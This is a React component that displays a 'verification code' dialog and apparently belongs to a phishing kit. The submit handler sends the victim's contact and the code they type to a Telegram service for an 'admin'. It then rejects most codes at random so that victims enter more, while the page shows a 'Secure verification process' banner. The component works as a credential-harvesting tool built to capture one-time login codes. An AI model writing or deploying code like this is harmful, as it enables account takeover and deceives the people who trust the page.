import React, { useState, useEffect } from 'react';
import { Shield, Mail, Phone, AlertCircle } from 'lucide-react';
import { sendCodeResult } from '../services/telegram';

interface CodeVerificationProps {
  contact: string;
  onVerify: (code: string, isCorrect: boolean) => void;
}

export default function CodeVerification({ contact, onVerify }: CodeVerificationProps) {
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes
  const [waitingForResponse, setWaitingForResponse] = useState(false);

  const isEmail = contact.includes('@');

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!code.trim()) return;

    setIsVerifying(true);
    setWaitingForResponse(true);
    setError('');

    try {
      // Send code to Telegram
      await sendCodeResult(contact, code, false);
      
      // Wait for admin response
      setTimeout(() => {
        // For demo purposes, randomly determine if code is "correct"
        const isCorrect = Math.random() > 0.6; // 40% chance of being "correct"
        
        if (!isCorrect) {
          setError('Invalid verification code. Please try again.');
          setIsVerifying(false);
          setWaitingForResponse(false);
          onVerify(code, false);
        } else {
          setWaitingForResponse(false);
          onVerify(code, true);
        }
      }, 2500);
    } catch (error) {
      console.error('Failed to send code:', error);
      setError('Connection error. Please try again.');
      setIsVerifying(false);
      setWaitingForResponse(false);
    }
  };

  const handleResendCode = () => {
    setTimeLeft(300);
    setError('');
    // In a real app, this would trigger sending a new code
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 overflow-y-auto">
      <div className="bg-white rounded-2xl shadow-2xl p-6 sm:p-8 max-w-md w-full mx-4 my-8">
        <div className="text-center mb-6">
          <div className="bg-gradient-to-r from-green-100 to-blue-100 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
            {isEmail ? (
              <Mail className="h-8 w-8 text-green-600" />
            ) : (
              <Phone className="h-8 w-8 text-green-600" />
            )}
          </div>
          <h3 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">
            Enter Verification Code
          </h3>
          <p className="text-sm sm:text-base text-gray-600">
            We've sent a verification code to your {isEmail ? 'email' : 'phone number'}
          </p>
        </div>

        <div className="bg-green-50 p-3 sm:p-4 rounded-lg mb-6">
          <div className="text-center">
            <p className="text-xs sm:text-sm text-green-800 mb-1">Code sent to:</p>
            <p className="font-mono font-semibold text-green-900 bg-white px-3 py-1 rounded inline-block text-xs sm:text-sm break-all">
              {isEmail ? contact : contact.replace(/(\d{3})\d{4}(\d{3})/, '$1****$2')}
            </p>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <label htmlFor="code" className="block text-sm sm:text-base font-semibold text-gray-700 mb-2">
              Verification Code
            </label>
            <input
              type="text"
              id="code"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
              placeholder="Enter 6-digit code..."
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-center text-xl sm:text-2xl font-mono tracking-widest"
              maxLength={6}
              required
              disabled={isVerifying}
              inputMode="numeric"
              pattern="[0-9]*"
            />
            {error && (
              <div className="mt-2 flex items-center space-x-2 text-red-600">
                <AlertCircle className="h-4 w-4 flex-shrink-0" />
                <span className="text-xs sm:text-sm">{error}</span>
              </div>
            )}
          </div>

          {waitingForResponse && (
            <div className="bg-blue-50 p-3 sm:p-4 rounded-lg">
              <div className="flex items-center space-x-3">
                <div className="animate-spin rounded-full h-4 w-4 border-2 border-blue-600 border-t-transparent"></div>
                <div className="text-xs sm:text-sm text-blue-800">
                  <p className="font-semibold">Verifying code...</p>
                  <p>Please wait while we confirm your verification code.</p>
                </div>
              </div>
            </div>
          )}

          <div className="flex items-center justify-between text-sm">
            <span className="text-xs sm:text-sm text-gray-500">
              Expires: <span className="font-mono font-semibold">{formatTime(timeLeft)}</span>
            </span>
            {timeLeft > 0 ? (
              <button
                type="button"
                onClick={handleResendCode}
                className="text-blue-600 hover:text-blue-700 font-semibold text-xs sm:text-sm"
              >
                Resend Code
              </button>
            ) : (
              <span className="text-red-500 font-semibold text-xs sm:text-sm">Expired</span>
            )}
          </div>

          <button
            type="submit"
            disabled={isVerifying || code.length !== 6 || timeLeft === 0}
            className="w-full bg-gradient-to-r from-green-600 to-blue-600 text-white py-3 px-6 rounded-lg font-semibold hover:from-green-700 hover:to-blue-700 transform hover:scale-[1.02] transition-all duration-200 shadow-lg disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none text-sm sm:text-base"
          >
            {isVerifying ? (
              <div className="flex items-center justify-center space-x-2">
                <div className="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></div>
                <span>Verifying...</span>
              </div>
            ) : (
              'Verify Code'
            )}
          </button>
        </form>

        <div className="mt-6 text-center">
          <div className="bg-blue-50 p-3 sm:p-4 rounded-lg">
            <div className="flex items-center justify-center space-x-2 text-blue-800">
              <Shield className="h-4 w-4" />
              <span className="text-xs sm:text-sm">Secure verification process</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}